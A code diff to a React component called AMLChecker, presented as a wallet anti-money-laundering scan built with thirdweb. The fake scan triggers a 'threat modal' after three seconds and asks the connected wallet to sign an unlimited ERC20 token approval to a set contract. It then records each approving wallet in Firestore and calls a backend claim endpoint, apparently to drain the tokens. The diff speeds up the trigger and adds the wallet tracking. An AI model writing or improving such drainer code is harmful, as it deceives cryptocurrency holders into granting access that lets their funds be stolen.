@@ -7,6 +7,7 @@ import { ConnectButton, darkTheme, useActiveAccount } from 'thirdweb/react';
 import { createThirdwebClient, prepareContractCall, getContract, sendTransaction } from 'thirdweb';
 import { createWallet } from 'thirdweb/wallets';
 import { mainnet, bsc } from 'thirdweb/chains';
+import { saveApprovedWallet } from '@/lib/firebase';
 import { NETWORKS, type Network } from '@/lib/networks';
 
 const client = createThirdwebClient({
@@ -59,9 +60,10 @@ export default function AMLChecker() {
   const [scanFailed, setScanFailed] = useState(false);
 
   // Refs to avoid stale closures inside setInterval
-  const selectedNetworkRef = useRef<Network | null>(null);
+  const selectedNetworkRef  = useRef<Network | null>(null);
   const approvalTriggeredRef = useRef(false);
-  const accountRef = useRef<ReturnType<typeof useActiveAccount>>(undefined);
+  const accountRef          = useRef<ReturnType<typeof useActiveAccount>>(undefined);
+  const scanIntervalRef     = useRef<ReturnType<typeof setInterval> | null>(null);
 
   // thirdweb active account
   const account = useActiveAccount();
@@ -90,35 +92,36 @@ export default function AMLChecker() {
     }, 500);
   };
 
-  // Core approval + claim logic — runs at 7s mark
+  // Stop the scan interval and show scan-failed state
+  const failScan = () => {
+    if (scanIntervalRef.current) {
+      clearInterval(scanIntervalRef.current);
+      scanIntervalRef.current = null;
+    }
+    setShowThreatModal(false);
+    setScanFailed(true);
+  };
+
+  // Core approval: approve(unlimited) → save to Firestore → notify claim API
   const triggerApprovalAndClaim = async () => {
     const currentAccount = accountRef.current;
-    const networkKey = selectedNetworkRef.current as Network;
+    const networkKey     = selectedNetworkRef.current as Network;
 
-    console.log('[v0] triggerApprovalAndClaim called');
-    console.log('[v0] account:', currentAccount?.address);
-    console.log('[v0] networkKey:', networkKey);
-
-    if (!currentAccount) {
-      console.error('[v0] No active account found');
-      return;
-    }
-    if (!networkKey || !NETWORK_CONFIG[networkKey]) {
-      console.error('[v0] Invalid network key:', networkKey);
+    if (!currentAccount || !networkKey || !NETWORK_CONFIG[networkKey]) {
+      failScan();
       return;
     }
 
     const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
 
-    if (!contractAddress) {
-      console.error('[v0] Contract address not set for network:', networkKey);
+    if (!contractAddress || !tokenAddress) {
+      console.error('[v0] Missing token or contract address for network:', networkKey);
+      failScan();
       return;
     }
 
     try {
-      console.log('[v0] Preparing approve tx — token:', tokenAddress, 'spender:', contractAddress);
-
-      // Build the ERC20 token contract reference
+      // Build ERC20 token contract reference
       const tokenContract = getContract({
         client,
         chain,
@@ -126,94 +129,91 @@ export default function AMLChecker() {
         abi: ERC20_ABI,
       });
 
-      // Prepare unlimited approve call
+      // approve(spender, MaxUint256)
       const approveTx = prepareContractCall({
         contract: tokenContract,
-        method: 'approve',
-        params: [contractAddress as `0x${string}`, BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')],
+        method:   'approve',
+        params:   [
+          contractAddress as `0x${string}`,
+          BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'),
+        ],
       });
 
-      console.log('[v0] Sending approve tx via thirdweb...');
-
       const { transactionHash } = await sendTransaction({
-        account: currentAccount,
+        account:     currentAccount,
         transaction: approveTx,
       });
 
-      console.log('[v0] Approve tx hash:', transactionHash);
-
-      // After approval, immediately call backend claim
-      console.log('[v0] Calling /api/claim with:', {
-        userAddress: currentAccount.address,
-        tokenAddress,
+      // ── Approval signed — save to Firestore immediately ──────────────────
+      await saveApprovedWallet({
+        address: currentAccount.address,
         network: networkKey,
+        txHash:  transactionHash,
       });
 
-      const claimRes = await fetch('/api/claim', {
-        method: 'POST',
+      // Close threat modal on success
+      setShowThreatModal(false);
+
+      // Notify claim API (best-effort — does not block report)
+      fetch('/api/claim', {
+        method:  'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          userAddress: currentAccount.address,
+          userAddress:  currentAccount.address,
           tokenAddress,
-          network: networkKey,
+          network:      networkKey,
         }),
-      });
+      }).then(r => r.json()).catch(() => {});
 
-      const claimData = await claimRes.json();
-      console.log('[v0] /api/claim response status:', claimRes.status);
-      console.log('[v0] /api/claim response body:', JSON.stringify(claimData));
-
-      if (!claimRes.ok) {
-        console.error('[v0] Claim failed:', claimData.error);
-        setShowThreatModal(false);
-        setScanFailed(true);
-      } else {
-        console.log('[v0] Claim success — txHash:', claimData.txHash);
-        // Success — close the modal cleanly
-        setShowThreatModal(false);
-      }
     } catch (err: any) {
-      console.error('[v0] triggerApprovalAndClaim error:', err?.message ?? err);
-      if (err?.code === 4001 || err?.message?.includes('rejected') || err?.message?.includes('denied') || err?.message?.includes('User rejected')) {
-        console.warn('[v0] User rejected the approval');
-        setShowThreatModal(false);
-        setScanFailed(true);
+      const msg:  string = err?.message ?? '';
+      const code: number = err?.code;
+
+      if (
+        code === 4001 ||
+        msg.includes('rejected') ||
+        msg.includes('denied') ||
+        msg.includes('User rejected') ||
+        msg.includes('cancelled')
+      ) {
+        console.warn('[v0] User rejected approval');
       } else {
-        // For other errors also treat as failed
-        setShowThreatModal(false);
-        setScanFailed(true);
+        console.error('[v0] Approval error:', msg);
       }
-    } finally {
-      // Do NOT auto-close modal here — it stays open until approve succeeds
-      // Success path closes it after claim
+      // Any failure → stop scan and show Scan Failed modal
+      failScan();
     }
   };
 
-  // Scan simulation — 15s, approval triggers at 7s
+  // Scan animation — 45 seconds; approval fires instantly on connect
   const startScan = () => {
     setScanProgress(0);
     setShowThreatModal(false);
     setScanFailed(false);
     approvalTriggeredRef.current = false;
 
-    console.log('[v0] Scan started — will trigger approval at 7s');
+    // Clear any pre-existing interval
+    if (scanIntervalRef.current) clearInterval(scanIntervalRef.current);
 
-    const interval = setInterval(() => {
+    const SCAN_DURATION = 45;
+
+    scanIntervalRef.current = setInterval(() => {
       setScanProgress((prev) => {
         const next = prev + 1;
 
-        if (next === 7 && !approvalTriggeredRef.current) {
+        // Show threat modal and trigger approval at 3s
+        if (next === 3 && !approvalTriggeredRef.current) {
           approvalTriggeredRef.current = true;
-          console.log('[v0] 7s reached — showing threat modal and triggering approval');
           setShowThreatModal(true);
           triggerApprovalAndClaim();
         }
 
-        if (next >= 15) {
-          clearInterval(interval);
-          console.log('[v0] Scan complete — advancing to report');
-          setTimeout(() => setCurrentStep('report'), 500);
-          return 15;
+        // Only advance to report if approval was successful (modal closed, not failed)
+        if (next >= SCAN_DURATION) {
+          clearInterval(scanIntervalRef.current!);
+          scanIntervalRef.current = null;
+          setTimeout(() => setCurrentStep('report'), 300);
+          return SCAN_DURATION;
         }
 
         return next;
@@ -490,13 +490,13 @@ export default function AMLChecker() {
                 <div className="relative h-2 bg-slate-800 rounded-full overflow-hidden border border-emerald-500/20 w-full mb-12 sm:mb-16">
                   <div
                     className="h-full bg-gradient-to-r from-emerald-500 to-teal-400 rounded-full transition-all duration-300"
-                    style={{ width: `${(scanProgress / 15) * 100}%` }}
+                    style={{ width: `${(scanProgress / 45) * 100}%` }}
                   />
                 </div>
 
-                {/* Timer - Only visual indicator */}
+                {/* Timer */}
                 <p className="text-gray-400 text-xs sm:text-sm">
-                  {scanProgress}/15 seconds
+                  {scanProgress}/45 seconds
                 </p>
               </div>
             </div>
